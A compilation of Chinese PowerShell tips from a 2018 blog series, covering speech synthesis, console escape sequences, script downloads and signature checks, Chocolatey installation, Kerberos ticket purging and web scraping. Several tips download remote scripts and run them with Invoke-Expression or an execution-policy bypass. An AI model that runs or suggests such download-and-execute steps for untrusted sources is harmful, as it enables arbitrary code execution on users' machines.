内置的文字转语音引擎可以输入纯文本，并且将它转换为语音，但它也可以通过“语音合成标记语言”来控制。通过这种方式，您可以对语音调优，控制音调，以及语言。 Windows 自带本地的语音引擎，所以最好控制一下采用的语言。否则，在德文系统上，您的英文文本发音听起来会很奇怪。 123456789101112131415Add-Type -AssemblyName System.speech$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer$Text = '&lt;speak version=&quot;1.0&quot; xmlns=&quot;http://www.w3.org/2001/10/synthesis&quot; xml:lang=&quot;en-US&quot;&gt; &lt;voice xml:lang=&quot;en-US&quot;&gt; &lt;prosody rate=&quot;1&quot;&gt; &lt;p&gt;Normal pitch. &lt;/p&gt; &lt;p&gt;&lt;prosody pitch=&quot;x-high&quot;&gt; High Pitch. &lt;/prosody&gt;&lt;/p&gt; &lt;/prosody&gt; &lt;/voice&gt;&lt;/speak&gt;'$synthesizer.SpeakSsml($Text) 根据已经安装的语音引擎，您现在甚至可以切换语言： 123456789101112131415161718192021222324252627Add-Type -AssemblyName System.speech$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer$Text1 = '&lt;speak version=&quot;1.0&quot; xmlns=&quot;http://www.w3.org/2001/10/synthesis&quot; xml:lang=&quot;en-US&quot;&gt; &lt;voice xml:lang=&quot;en-US&quot;&gt; &lt;prosody rate=&quot;1&quot;&gt; &lt;p&gt;Normal pitch. &lt;/p&gt; &lt;p&gt;&lt;prosody pitch=&quot;x-high&quot;&gt; High Pitch. &lt;/prosody&gt;&lt;/p&gt; &lt;/prosody&gt; &lt;/voice&gt;&lt;/speak&gt;'$text2 = '&lt;speak version=&quot;1.0&quot; xmlns=&quot;http://www.w3.org/2001/10/synthesis&quot; xml:lang=&quot;en-US&quot;&gt; &lt;voice xml:lang=&quot;de-de&quot;&gt; &lt;prosody rate=&quot;1&quot;&gt; &lt;p&gt;Normale Tonhöhe. &lt;/p&gt; &lt;p&gt;&lt;prosody pitch=&quot;x-high&quot;&gt; Höhere Tonlage. &lt;/prosody&gt;&lt;/p&gt; &lt;/prosody&gt; &lt;/voice&gt;&lt;/speak&gt;'$synthesizer.SpeakSsml($Text1)$synthesizer.SpeakSsml($Text2) 如果您想在文字中混合多种语言，您也可以使用传统的 COM 对象 Sapi.SpVoice。以下代码来自前一个技能： 123456789$text = &quot;&lt;LANG LANGID=&quot;&quot;409&quot;&quot;&gt;Your system will restart now!&lt;/LANG&gt;&lt;LANG LANGID=&quot;&quot;407&quot;&quot;&gt;&lt;PITCH MIDDLE = '2'&gt;Oh nein, das geht nicht!&lt;/PITCH&gt;&lt;/LANG&gt;&lt;LANG LANGID=&quot;&quot;409&quot;&quot;&gt;I don't care baby&lt;/LANG&gt;&lt;LANG LANGID=&quot;&quot;407&quot;&quot;&gt;Ich rufe meinen Prinz! Herbert! Tu was!&lt;/LANG&gt;&quot;$speaker = New-Object -ComObject Sapi.SpVoice$speaker.Rate = 0$speaker.Speak($text)","link":"/2018/03/21/synthesizing-speech-using-speech-synthesis-markup-language-ssml-part-3/"},{"title":"PowerShell 技能连载 - 语音合成 – 使用不同的语音（第 4 部分）","text":"Windows 10 自带优秀的文本转语音功能，以及不同的高品质语音。要查看哪些语音可用，请试试以下代码： 123456Add-Type -AssemblyName System.speech$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer$synthesizer.GetInstalledVoices().VoiceInfo | Where-Object { $_.Name -notlike 'Microsoft Server*' } | Select-Object -Property Name, Gender, Age, Culture 结果类似如下（根据您的 windows 版本、语言文化，和安装的组件可能有所不同）： 12345Name Gender Age Culture---- ------ --- -------Microsoft Zira Desktop Female Adult en-USMicrosoft David Desktop Male Adult en-USMicrosoft Hedda Desktop Female Adult de-DE 要使用这些语音，请用 SelectVoice()： 1234567891011121314151617181920212223$sampleText = @{ [System.Globalization.CultureInfo]::GetCultureInfo(&quot;en-us&quot;) = &quot;Hello, I am speaking English! I am &quot; [System.Globalization.CultureInfo]::GetCultureInfo(&quot;de-de&quot;) = &quot;Halli Hallo, man spricht deutsch hier! Ich bin &quot; [System.Globalization.CultureInfo]::GetCultureInfo(&quot;es-es&quot;) = &quot;Una cerveza por favor! Soy &quot; [System.Globalization.CultureInfo]::GetCultureInfo(&quot;fr-fr&quot;) = &quot;Vive la france! Je suis &quot; [System.Globalization.CultureInfo]::GetCultureInfo(&quot;it-it&quot;) = &quot;Il mio hovercraft è pieno di anguille! Lo sono &quot; }Add-Type -AssemblyName System.speech$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer$synthesizer.GetInstalledVoices().VoiceInfo | Where-Object { $_.Name -notlike 'Microsoft Server*' } | Select-Object -Property Name, Gender, Age, Culture | ForEach-Object { $_ $synthesizer.SelectVoice($_.Name) $synthesizer.Speak($sampleText[$_.Culture] + $_.Name) } 哪些语音可用，依赖于系统已安装了哪些语言。以下链接解释了不同语言的 Windows 10 自带了哪些语音： https://support.microsoft.com/en-us/help/22797/windows-10-narrator-tts-voices.请注意 SeletVoice() 并不能使用所有已安装的语音。","link":"/2018/03/22/synthesizing-speech-using-different-voices-part-4/"},{"title":"PowerShell 技能连载 - 安全地嵌入变量","text":"当您在 PowerShell 中使用双引号时，您可以向字符串中增加变量，PowerShell 能自动将它们替换成它们的值——这并不是什么新鲜事： 123$ID = 234&quot;Server $ID Rack12&quot; 然而，PowerShell 自动判断一个变量的结束位置，所以当您希望在一个文本中插入一个不含空格的数字时，这种写法可能会失败： 123$ID = 234&quot;Server$IDRack12&quot; 如同语法高亮的信息，PowerShell 会将变量识别成 $IDRack12 因为它无法意识到变量名提前结束。 在这些情况下，只需要用大括号将变量名括起来即可： 123$ID = 234&quot;Server${ID}Rack12&quot;","link":"/2018/03/23/safely-embedding-variables/"},{"title":"PowerShell 技能连载 - 为控制台输出加下划线","text":"从 PowerShell 5.1 开始，PowerShell 控制台支持 VT 转义序列，它可以用于对控制台文本定位和格式化。请注意它只对控制台有效，而对 PowerShell ISE 无效。另外还请注意您需要 Windows 10 或者类似 ConEmu 等模拟器。 要实验这个功能，请在 PowerShell 控制台中运行以下代码： 12$esc = [char]27&quot;$esc[4mOutput is now underlined!&quot; PowerShell 现在对所有的输出加下划线。输入文本并没有加下划线（由于 PSReadLine 处理所有输入文本的格式）。 要关闭格式化功能，请运行这段代码： 12$esc = [char]27&quot;$esc[0mReset&quot; 我们将会在未来的技能中介绍更多的控制台文字格式化技术。以下是 VT 转义序列的更深入介绍：https://docs.microsoft.com/en-us/windows/console/console-virtual-terminal-sequences.","link":"/2018/03/26/using-underlined-console-output/"},{"title":"PowerShell 技能连载 - 在同一行输出日志信息","text":"从 PowerShell 5.1 开始，PowerShell 控制台支持 VT 转义序列，它可以用于对控制台文本定位和格式化。请注意它只对控制台有效，而对 PowerShell ISE 无效。另外还请注意您需要 Windows 10 或者类似 ConEmu 等模拟器。 VT 转义序列可以将控制台光标设置到当前行的任意位置。通过这种方式，您可以方便地创建一个函数，输出状态或者日志信息到控制台。并且每条新信息覆盖之前的信息而不是增加新的行。 12345678910111213141516171819function Write-ConsoleMessage([string]$Message){ $esc = [char]27 $consoleWidth = [Console]::BufferWidth $outputText = $Message.PadRight($consoleWidth) $gotoFirstColumn = &quot;$esc[0G&quot; Write-Host &quot;$gotoFirstColumn$outputText&quot; -NoNewline}function test{ Write-ConsoleMessage -Message 'Starting...' Start-Sleep -Seconds 1 Write-ConsoleMessage -Message 'Doing something!' Start-Sleep -Seconds 1 Write-ConsoleMessage -Message 'OK.'}test","link":"/2018/03/27/output-log-messages-in-the-same-line/"},{"title":"PowerShell 技能连载 - PowerShell 控制台光标定位","text":"从 PowerShell 5.1 开始，PowerShell 控制台支持 VT 转义序列，它可以用于对控制台文本定位和格式化。请注意它只对控制台有效，而对 PowerShell ISE 无效。另外还请注意您需要 Windows 10 或者类似 ConEmu 等模拟器。 VT 转义序列可以将控制台光标设置到控制台窗口的任意位置。例如，要将光标设置到左上角，请使用以下代码： 1234$esc = [char]27$setCursorTop = &quot;$esc[0;0H&quot;Write-Host &quot;${setCursorTop}This always appears in line 0 and column 0!&quot; 当您运行这段代码时，文字总是定位在第 0 行 第 0 列。您可以使用这种技术来创建您自己的进度指示器——只需要记住：这一切只在控制台窗口中有效，在 PowerShell ISE 中无效。 123456789101112131415161718192021222324252627282930function Show-CustomProgress{ try { $esc = [char]27 # let the caret move to column (horizontal) pos 12 $column = 12 $resetHorizontalPos = &quot;$esc[${column}G&quot; $gotoFirstColumn = &quot;$esc[0G&quot; $hideCursor = &quot;$esc[?25l&quot; $showCursor = &quot;$esc[?25h&quot; $resetAll = &quot;$esc[0m&quot; # write the template text Write-Host &quot;${hideCursor}Processing %.&quot; -NoNewline 1..100 | ForEach-Object { # insert the current percentage Write-Host &quot;$resetHorizontalPos$_&quot; -NoNewline Start-Sleep -Milliseconds 100 } } finally { # reset display Write-Host &quot;${gotoFirstColumn}Done. $resetAll$showCursor&quot; }} 运行这段代码后，执行 Show-CustomProgress 命令，您将会见到一个不断增长的自定义进度指示器。控制台隐藏了闪烁的光标提示。当进度指示器结束时，或者当按下 CTRL + C 时，进度指示器将会隐藏，","link":"/2018/03/28/positioning-the-powershell-console-cursor/"},{"title":"PowerShell 技能连载 - 在 PowerShell 控制台中使用颜色","text":"从 PowerShell 5.1 开始，PowerShell 控制台支持 VT 转义序列，它可以用于对控制台文本定位和格式化。请注意它只对控制台有效，而对 PowerShell ISE 无效。另外还请注意您需要 Windows 10 或者类似 ConEmu 等模拟器。 要对一段文字着色，您在任何 PowerShell 版本中都可以使用 Write-Host 和它的 -ForegroundColor 和 -BackgroundColor 属性： 12345678910111213141516171819202122232425262728foreach($color1 in (0..15)){ foreach($color2 in (0..15)) { Write-Host -ForegroundColor ([ConsoleColor]$color1) -BackgroundColor ([ConsoleColor]$color2) -Object &quot;X&quot; -NoNewline } Write-Host}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 通过使用 VT 转义序列，您可以使用范围更广的颜色。可以将前景色和背景色设为任意的 RGB 颜色。每个通道可以有 8 比特 (0-255)： 1234567891011121314# Red/Green/Blue foreground$r = 0$g = 20$b = 255# Red/Green/Blue background$rback = 255$gback = 100$bback = 0$esc = [char]27# compose escape sequence&quot;$esc[38;2;$r;$g;$b;48;2;$rback;$gback;${bback}mCOLORFUL TEXT$esc[0m&quot; 以下代码创建所有可能的颜色，并且将它们显示在由 256 个字符组成的一行上，并且每一行叠加在前一行之上，这样可以获得一个渐变发光的效果： 1234567891011121314151617181920212223242526272829$esc = [char]27$setCursorTop = &quot;$esc[0;0H&quot;foreach($rback in (0..255)){ foreach($gback in (0..255)) { foreach($bback in (0..255)) { foreach($r in (0..255)) { foreach($g in (0..255)) { [System.Text.StringBuilder]$line = &quot;&quot; foreach($b in (0..255)) { $null = $line.Append(&quot;$esc[38;2;$r;$g;$b;48;2;$rback;$gback;${bback}mX$esc[0m&quot;) } $text = $line.ToString() Write-Host &quot;$setCursorTop$Text&quot; } Write-Host } } }}","link":"/2018/03/29/using-colors-in-powershell-console/"},{"title":"PowerShell 技能连载 - 对 Cmdlet 的输出着色","text":"从 PowerShell 5.1 开始，PowerShell 控制台支持 VT 转义序列，它可以用于对控制台文本定位和格式化。请注意它只对控制台有效，而对 PowerShell ISE 无效。另外还请注意您需要 Windows 10 或者类似 ConEmu 等模拟器。 当您向 Select-Object 命令传入一个哈希表时，该哈希表能够产生“计算的”列。它提供了两块信息：名字（列名）和表达式（一个生成列内容的脚本块）。 这对为 cmdlet 的输出着色十分有用。只需要创建一个添加彩色的 VT 转义序列的表达式即可。在以下例子中，一些文件类型被着色： 123456789101112131415161718$ColoredName = @{ Name = &quot;Name&quot; Expression = { switch ($_.Extension) { '.exe' { $color = &quot;255;0;0&quot;; break } '.log' { $color = '0;255;0'; break } '.ini' { $color = &quot;0;0;255&quot;; break } default { $color = &quot;255;255;255&quot; } } $esc = [char]27 &quot;$esc[38;2;${color}m$($_.Name)${esc}[0m&quot; }}Get-ChildItem $env:windir | Select-Object -Property Mode, LastWriteTime, Length, $ColoredName","link":"/2018/03/30/colorizing-cmdlet-output/"},{"title":"PowerShell 技能连载 - 下载脚本文件的最佳方式","text":"有时候，PowerShell 脚本的作者将脚本放在直接下载的服务器上。让我们寻找一种最有效的通过 PowerShell 下载文本文件的方法。我们将以 PowerShell Team 成员 Lee Holmes 发布的著名的 “Dancing Rick ASCII” 脚本作为我们的例子。它的下载地址位于这里（需要翻墙）： http://bit.ly/e0Mw9w 当在浏览器中打开时，您将会见到以纯文本方式显示的 PowerShell 源代码，并且原始的 URL 将会显示在浏览器的地址栏里： http://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1 许多用户像这样使用 .NET 方法来下载文本文件： 1234567# download code$url = &quot;http://bit.ly/e0Mw9w&quot;$webclient = New-Object Net.WebClient$code = $webclient.DownloadString($url)# output code$code 其实并不需要这样，因为 Invoke-WebRequest 是对该对象的更好的封装： 1234# download code$url = &quot;http://bit.ly/e0Mw9w&quot;$page = Invoke-WebRequest -Uri $url -UseBasicParsing$code = $page.Content 通过它的参数，它能直接支持代理并且支持凭据。 还有一个更方便的 cmdlet Invoke-RestMethod。它基本上做的是相同的是，不过返回的数据是文本，JSON，或 XML： 123# download code$url = &quot;http://bit.ly/e0Mw9w&quot;$code = Invoke-RestMethod -Uri $url -UseBasicParsing 假设您信任这段代码，相信它不会损害您的系统，您可以这样执行它： 12# invoke the codeInvoke-Expression -Command $code 或者，您可以将它保存到磁盘，并且以一个普通的 PowerShell 脚本的方式执行它： 12345678# download code$url = &quot;http://bit.ly/e0Mw9w&quot;$code = Invoke-RestMethod -Uri $url -UseBasicParsing# save to file and run$outPath = &quot;$home\\Desktop\\dancingRick.ps1&quot;$code | Set-Content -Path $outPath -Encoding UTF8Start-Process -FilePath powershell -ArgumentList &quot;-noprofile -noexit -executionpolicy bypass -file &quot;&quot;$outPath&quot;&quot;&quot; 如果您打算先将内容保存到一个文件，那么 Invoke-WebRequest 是一个更好的选择，因为它可以直接将内容保存到文件： 12345# download code$url = &quot;http://bit.ly/e0Mw9w&quot;$outPath = &quot;$home\\Desktop\\dancingRick.ps1&quot;$code = Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $outPath&amp; $outPath 您可以通过调用操作符 (&amp;) 在您自己的 PowerShell 会话中运行下载的文件，而不是使用 Start-Process。如果执行失败，通常是因为您的执行策略不允许 PowerShell 脚本。请按如下方法改变设置，然后重试： 1PS&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned","link":"/2018/04/02/the-best-ways-to-download-script-files/"},{"title":"PowerShell 技能连载 - 信任下载的文件","text":"通过 Internet 下载的脚本，很有可能被恶意软件感染过，或者源头是法非的数据来源。数字签名可以增加一个额外的信任和保护层。 作为示例，我们将测试官方的 “Chocolatey” 安装脚本，它的下载地址在这里： https://chocolatey.org/install.ps1 当您在浏览器中打开这个 URL 时，您将会看到一个十分长的 PowerShell 脚本，您现在需要十分谨慎地检查每一行代码，在运行它之前确保它是完整的，并且不会作恶。 幸运的是，在脚本的尾部您会发现一个非常长的注释块。这是一个数字签名。要检查是否能够信任该脚本，以及它是否未被篡改过，您需要将该代码保存到一个文件中。然后，您可以验证签名： 1234567# save script to file$url = 'https://chocolatey.org/install.ps1'$outPath = &quot;$env:temp\\installChocolatey.ps1&quot;Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outPath# test signatureGet-AuthenticodeSignature -FilePath $outPath 结果看起来类似这样： Directory: C:\\Users\\tobwe\\AppData\\Local\\Temp SignerCertificate Status Path ----------------- ------ ---- 493018BA27EAA09B895BC5660E77F694B84877C7 Valid installChocolatey.ps1 如果 “Status” 列报告 “Valid”，那么说明： 这个文件未被篡改过，是原始的内容 该文件是由 “SignerCertificate” 报告的证书创建的 当然您不能理解 “493018BA27EAA09B895BC5660E77F694B84877C7” 是谁，但您可以确定 Windows 认为该证书是可信任的，，所以您可以十分安全地运行这个脚本（如果您想了解 493018BA27EAA09B895BC5660E77F694B84877C7 到底是谁，请看明天的技能）。 以下是 “Status” 其它可能的情况： HashMismatch：文件内容被修改。这种情况高度可疑。 Unknown：签名的证书不被信任。任何人都有可能签名了这个文件。这个签名对您没有任何意义。 NotSigned：该脚本没有签名。 如果 Status 的值不是 Valid，那么该签名对您没有任何意义，在运行之前必须人工检查和测试代码。 如果 Status 的值是 Valid，那么您可以明确地确定创建脚本的人，而且您可以安全地认为它没有被其他人改过。不过，一个合法的签名并不是完全地保证，说明该脚本是无害的。","link":"/2018/04/04/trusting-downloaded-scripts/"},{"title":"PowerShell 技能连载 - 执行策略和下载的脚本文件","text":"当您从 internet 下载了一个文件，它可能会被 Windows 标记（通过 NTFS 流），并且 PowerShell 可能会拒绝执行它： 123456789PS&gt; &amp; &quot;$home\\desktop\\Rick.ps1&quot;&amp; : File C:\\Users\\tobwe\\desktop\\Rick.ps1 cannot be loaded. The file C:\\Users\\tobwe\\desktop\\Rick.ps1 is not digitally signed. You cannot run this script on thecurrent system. For more information about running scripts and setting execution policy, see about_Execution_Policies athttps:/go.microsoft.com/fwlink/?LinkID=135170.At line:1 char:3+ &amp; &quot;$home\\desktop\\Rick.ps1&quot;+ ~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess 通常，当执行策略没有设置，或者设成 “RemoteSigned” 的时候会出现这种情况。这是普通 PowerShell 用户推荐的设置。以下是启用设置的方法： 1PS&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned 当启用以后，您可以运行任何本地脚本文件，或域之内的网络文件，但您不再能运行标记为“下载”的脚本，或从您域之外的网络位置下载的脚本。 要运行屏蔽的脚本，以下是您的选项： 取消对该文件的屏蔽，主要是通过打开它的属性对话框，单击“解除锁定” 使用 Unblock-File 将文件内容拷贝到一个新的文件 将执行策略设为 “Bypass” 用不会标记下载文件的浏览器来下载，或用 Invoke-WebRequest 来下载： 1PS&gt; Invoke-WebRequest -Uri &quot;http://bit.ly/e0Mw9w&quot; -UseBasicParsing -OutFile &quot;$home\\Desktop\\Rick.ps1&quot; Invoke-WebRequest 不会对下载的文件做标记，而且允许通过执行策略，这是挺令人意外的行为。","link":"/2018/04/03/execution-policy-and-downloaded-script-files/"},{"title":"PowerShell 技能连载 - 检查数字签名","text":"当您从 internet 下载一个脚本时，它可能包含了一个数字签名，数字签名能帮您确定脚本是从哪里来的。我们在前一个技能里讨论了这个内容，以下是我们使用的代码：它将一个 PowerShell 脚本下载到磁盘，然后显示它的数字签名： 1234567# save script to file$url = 'https://chocolatey.org/install.ps1'$outPath = &quot;$env:temp\\installChocolatey.ps1&quot;Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outPath# test signatureGet-AuthenticodeSignature -FilePath $outPath 结果类似这样： Directory: C:\\Users\\tobwe\\AppData\\Local\\Temp SignerCertificate Status Path ----------------- ------ ---- 493018BA27EAA09B895BC5660E77F694B84877C7 Valid installChocolatey.ps1 “Status” 列报告了这个文件是否可信。然而如何获取更多的关于证书和它的所有者的信息，特别是找出 “493018BA27EAA09B895BC5660E77F694B84877C7” 是谁？ 只需要将签名证书传给一个 Windows API 函数，就可以显示证书的属性对话框： 1234567891011# save script to file$url = 'https://chocolatey.org/install.ps1'$outPath = &quot;$env:temp\\installChocolatey.ps1&quot;Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outPath# test signature$result = Get-AuthenticodeSignature -FilePath $outPath$signerCert = $result.SignerCertificateAdd-Type -Assembly System.Security[Security.Cryptography.x509Certificates.X509Certificate2UI]::DisplayCertificate($signerCert) 现在您能了解到该证书编号指向 “Chocolatey Software, Inc” 公司，以及该证书是由 DigiCert 颁发。这是为什么 Windows 信任该签名：DigiCert 采取措施验证签名人的个人详细信息。","link":"/2018/04/05/examining-digital-signature-signers/"},{"title":"PowerShell 技能连载 - 用 PowerShell 操作 Chocolatey","text":"Chocolatey 是一个 Windows 平台上免费的包管理器，可以用来下载和安装软件。 在用 PowerShell 操作 Chocolatey 之前，您需要下载和安装它。如果您没有管理员特权，请使用以下代码。它将下载安装脚本，检测它的数字签名并确保它是合法的，然后运行它： 1234567891011121314151617181920# download and save installation script, then check signature$url = 'https://chocolatey.org/install.ps1'$outPath = &quot;$env:temp\\installChocolatey.ps1&quot;Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outPath# test signature$result = Get-AuthenticodeSignature -FilePath $outPathif ($result.Status -ne 'Valid'){ Write-Warning &quot;Installation Script Damaged/Malware?&quot; exit 1}# install chocolatey for current user$env:ChocolateyInstall='C:\\ProgramData\\chocoportable'Start-Process -FilePath powershell -ArgumentList &quot;-noprofile -noExit -ExecutionPolicy Bypass -File &quot;&quot;$outPath&quot;&quot;&quot; -Wait# clean upRemove-Item -Path $outPath 要查看更多的安装选项，请访问 https://chocolatey.org/install。 以上脚本不需要管理员权限，以便携应用的方式安装 Chocolatey。要使用它，您需要临时将安装文件夹添加到 Windows 的 Path 环境变量。然后输入 choco 来测试安装情况。该命令将汇报它的版本号： 1234567PS&gt; $env:path += &quot;;C:\\ProgramData\\chocoportable&quot;PS&gt; chocoChocolatey v0.10.8Please run 'choco -?' or 'choco -?' for help menu.PS&gt; 我们将看看如何使用 Chocolatey 自动下载和安装 PowerShell Core 6，然后和您当前 Windows PowerShell 安装并行地使用它。 同时，访问 https://chocolatey.org/packages?q=notepadplusplus 来查看您是否可以通过 Chocolatey 来安装。以下是使用 Chocolatey 需要考虑的关键步骤： 使用 PowerShell 控制台窗口。不要使用没有真正控制台窗口的 PowerShell 宿主（例如 ISE） 如果可能，使用管理员权限运行 PowerShell。许多包需要完整的 Administrator 权限来安装软件 将 Chocolatey 安装路径添加到 Path 环境变量 当您的环境准备好后，可以试试下载和安装一个工具，例如 Notepad++ 是多么简单： PS C:\\&gt; $env:path += &quot;;C:\\ProgramData\\chocoportable&quot; PS C:\\&gt; choco install notepadplusplus -y Chocolatey v0.10.8 [Pending] Removing incomplete install for 'notepadplusplus' Installing the following packages: notepadplusplus By installing you accept licenses for the packages. notepadplusplus.install v7.5.6 [Approved] notepadplusplus.install package files install completed. Performing ot her installation steps. Installing 64-bit notepadplusplus.install... notepadplusplus.install has been installed. notepadplusplus.install installed to 'C:\\Program Files\\Notepad++' Added C:\\ProgramData\\chocoportable\\bin\\notepad++.exe shim pointed to ' c:\\program files\\notepad++\\notepad++.exe'. notepadplusplus.install may be able to be automatically uninstalled. The install of notepadplusplus.install was successful. Software installed as 'exe', install location is likely default. notepadplusplus v7.5.6 [Approved] notepadplusplus package files install completed. Performing other inst allation steps. The install of notepadplusplus was successful. Software install location not explicitly set, could be in package or default install location if installer. Chocolatey installed 2/2 packages. See the log for details (C:\\ProgramData\\chocoportable\\logs\\chocolatey .log). PS C:\\&gt; 当 Chocolatey 完成安装 Notepad++ 的安装后，只需要按下 Win + R 键，然后在“运行”对话框中输入 Notepad++ 编辑器就启动了。","link":"/2018/04/06/using-chocolatey-with-powershell/"},{"title":"PowerShell 技能连载 - 用 Chocolatey 安装 PowerShell 6","text":"在之前的技能中，我们解释了如何下载和安装 Chocolatey，一个免费的 Windows 包管理器，可以用来安装软件。 今天，我们将看看如何用 Chocolatey 下载 PowerShell Core 6，这样您就可以体验它了。该安装并不会改变当前的 PowerShell 版本，所以您可以安全地同时安装它。 要安装 PowerShell Core 包，您需要管理员权限。用完整管理员权限打开一个 PowerShell 窗口。请不要用 PowerShell ISE 打开 Chocolatey，因为 PowerShell ISE 无法显示交互式控制台信息和提示。 如果您将 chocolatey 安装为一个便携式软件，请将它的路径添加到 Windows 的 Path 环境变量中。然后运行安装命令： 123PS&gt; $env:path += &quot;;C:\\ProgramData\\chocoportable&quot;PS&gt; choco install powershell-core -y 当 Choco 确定依赖关系、下载和安装必备项时，您将会见到一系列信息，最后才是安装 PowerShell Core 6。 当安装完成时，PowerShell Core 6 可以在 C:\\Program Files\\PowerShell\\[Version]\\pwsh.exe 这儿找到。 要确认您通过 Chocolatey 安装的包是否过时，请运行这条命令： 1PS&gt; choco outdated 如果需要更新一个已安装的包，请使用这条命令： powershell PS C:\\&gt; choco upgrade powershell-core Chocolatey v0.10.8 Upgrading the following packages: powershell-core By upgrading you accept licenses for the packages. powershell-core v6.0.2 is the latest version available based on your source(s). Chocolatey upgraded 0/1 packages. See the log for details (C:\\ProgramData\\chocoportable\\logs\\chocolatey.log). PS C:\\&gt;","link":"/2018/04/09/installing-powershell-6-with-chocolatey/"},{"title":"PowerShell 技能连载 - 创建十六进制数值","text":"有一系列方法可以将十进制数据转为十六进制表示： 1234567$value = 255[Convert]::ToString($value, 16)'{0:x}' -f $value'{0:X}' -f $value'{0:x10}' -f $value'{0:X10}' -f $value","link":"/2018/04/10/creating-hexadecimal-values/"},{"title":"PowerShell 技能连载 - 清除当前用户的 Kerberos 票证","text":"如果要应用更新的权限设置，并不需要重启系统。而只需要清除 Kerberos 票证就可以基于当前的权限获取一个新的票证。 In PowerShell, use this command to purge all cached Kerberos tickets:在 PowerShell 中，只需要用这条命令就可以清除所有缓存的 Kerberos： 1234567PS&gt; klist purgeCurrent LogonId is 0:0x2af9a Deleting all tickets: Ticket(s) purged!PS&gt;","link":"/2018/04/11/purging-kerberos-tickets-for-the-current-user/"},{"title":"PowerShell 技能连载 - 清除所有账户的 Kerberos 票证","text":"在前一个技能中我们介绍了 klist.exe 以及如何用它来清除当前用户的所有 Kerberos 票证，这样新的权限可以立即生效。 由于 PowerShell 可以很好地调用外部应用程序，例如 klist.exe，所以结合其它 PowerShell 命令，功能可以变得更强大。以下代码可以获取所有非使用 NTLM（例如 Kerberos 会话）的登录会话： 1Get-WmiObject -ClassName Win32_LogonSession -Filter &quot;AuthenticationPackage != 'NTLM'&quot; 在提权过的 PowerShell 中运行这行代码，将可以看到所有登录会话。只需要做一点小修改，就可以获取十六进制的登录 ID： 12Get-WmiObject -ClassName Win32_LogonSession -Filter &quot;AuthenticationPackage != 'NTLM'&quot; |ForEach-Object {[Convert]::ToString($_.LogonId, 16)} 要清除所有会话的缓存的 Kerberos 票证，您可以（在提权的 PowerShell 中）运行这段代码： 123Get-WmiObject -ClassName Win32_LogonSession -Filter &quot;AuthenticationPackage != 'NTLM'&quot; |ForEach-Object {[Convert]::ToString($_.LogonId, 16)} |ForEach-Object { klist.exe purge -li $_ }","link":"/2018/04/12/purging-kerberos-tickets-for-all-accounts/"},{"title":"PowerShell 技能连载 - 从 Internet 下载信息（第 1 部分）","text":"PowerShell 带来了两个 cmdlet，可以用来从 internet 获取信息。今天，我们重点关注 Invoke-WebRequest。 这个 cmdlet 提供了一个简单的 web 客户端。传给它一个 URL，它就可以帮您下载该网页。以下简单的几行代码可以帮您下载 psconf.eu 的议程表： 12$page = Invoke-WebRequest -Uri powershell.beer -UseBasicParsing$page.Content 由于它是 JSON 格式的，所以可以将它通过管道传递给 ConvertFrom-Json 来获得对象： 12$page = Invoke-WebRequest -Uri powershell.beer -UseBasicParsing$page.Content | ConvertFrom-Json | Out-GridView 然而，有些时候（例如这个例子），它并不能正确地“展开”集合结果，所以得手工操作它： 12$page = Invoke-WebRequest -Uri powershell.beer -UseBasicParsing$($page.Content | ConvertFrom-Json) | Out-GridView 通过这种方法，您可以下载网页上的任意信息，然后处理它。如果一个 web 页返回的是 XML，您可以将它转换为 XML，而如果它是纯 HTML，您可以使用正则表达式来提取您需要的信息。更多信息请见将来的技能。","link":"/2018/04/13/downloading-information-from-internet-part-1/"},{"title":"PowerShell 技能连载 - 从 Internet 下载信息（第 2 部分）","text":"Invoke-WebRequest 可以下载任意类型的信息，而且可以根据您的需要将它转为任意类型。在前一个技能里，我们演示了如何处理 JSON 数据。现在我们来看看返回 XML 数据的网页： 这个例子从欧洲中央银行获取当前的货币兑换率： 123$url = 'http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml'$result = Invoke-WebRequest -Uri $url -UseBasicParsing$result.Content 以下是结果： 1234$url = 'http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml'$result = Invoke-WebRequest -Uri $url -UseBasicParsing$xml = [xml]$result.Content$xml.Envelope.Cube.Cube.Cube","link":"/2018/04/16/downloading-information-from-internet-part-2/"},{"title":"PowerShell 技能连载 - 从 Internet 下载信息（第 3 部分）","text":"在前一个技能中，我们演示了如何使用 Invoke-WebRequest 从网页下载数据，并且处理 JSON 或 XML 格式的数据。然而，多数网页包含的是纯 HTML 数据。您可以使用正则表达式来从纯 HTML 中提取信息。 以下是获得网页内容的方法： 123$url = 'http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl'$page = Invoke-WebRequest -Uri $url -UseBasicParsing$page.Content 这个例子中的网页提供随机的借口。要获得最终的借口，得先创建正则表达式模式： 12345678910$url = 'http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl'$page = Invoke-WebRequest -Uri $url -UseBasicParsing$content = $page.Content$pattern = '(?s)&lt;br&gt;&lt;font size\\s?=\\s?&quot;\\+2&quot;&gt;(.+)&lt;/font'if ($page.Content -match $pattern){ $matches[1]} 当您运行这段代码时，它可以提供一个新的借口。我们在此不深入讨论正则表达式。该正则表达式的基本原理是查找 )&lt;br&gt;&lt;font size\\s?=\\s?&quot;\\+2&quot;&gt; 